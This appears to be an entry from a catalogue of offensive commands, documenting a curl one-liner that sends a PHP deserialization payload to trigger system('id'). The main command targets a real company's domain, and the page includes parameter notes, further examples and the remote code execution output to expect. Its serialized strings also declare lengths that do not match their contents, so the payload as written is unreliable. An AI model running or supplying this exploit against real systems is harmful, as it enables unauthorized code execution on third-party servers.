---
data: >-
  curl -X POST -d
  "user_input=O:21:\"Security\":1:{s:4:\"_ake\";s:6:\"system\";s:4:\"_exe\";s:7:\"id\";}"
  https://www.rockstargames.com/vulnerable-endpoint
tags:
  - web
  - exploit
  - php
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.248Z'
id: c1f8b1a2-3e03-481f-a1e9-3619d08e569a
verified: false
validated: true
submitted: true
---
---

# curl-send-unserialize-payload

## Command

```bash
curl -X POST -d "user_input=O:21:\"Security\":1:{s:4:\"_ake\";s:6:\"system\";s:4:\"_exe\";s:7:\"id\";}" https://www.rockstargames.com/vulnerable-endpoint
```

## Description

This command uses curl to send a POST request with a crafted PHP serialized payload to a vulnerable endpoint, triggering arbitrary function invocation upon unserialization. It is used to exploit deserialization flaws in PHP web applications for remote code execution testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-d` | Data to send in the request body | Yes |
| `user_input` | The parameter name for the serialized payload (adjust based on endpoint) | Yes |
| URL | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d "user_input=O:21:\"Security\":1:{s:4:\"_ake\";s:6:\"phpversion\";}" https://target.com/vuln
```

### Advanced Usage

```bash
curl -X POST -d "user_input=$(php -r 'echo serialize(new CustomClass());')" -H "Content-Type: application/x-www-form-urlencoded" https://target.com/vuln --verbose
```

## Expected Output

Successful execution returns an HTTP response containing the output of the invoked PHP function, such as version info or command results (e.g., "PHP 7.4.3" or "uid=33(www-data)"). Errors may show serialization failures or 500 server errors if blocked.

## Related

- [[Related Procedure: Exploit-PHP-Unserialize-Arbitrary-Function-Invocation]]
